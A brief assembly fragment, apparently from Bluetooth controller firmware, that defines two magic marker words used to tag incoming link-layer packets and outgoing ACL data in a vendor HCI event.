	.word	0x434C5852		# "RXLC" in little-endian — marks incoming LC packet (BLE LL, ACL, etc.)
ACL_MARKER:
	.word	0x584C4341		# "ACLX" in little-endian — marks outgoing ACL data in HCI Event 0xFF

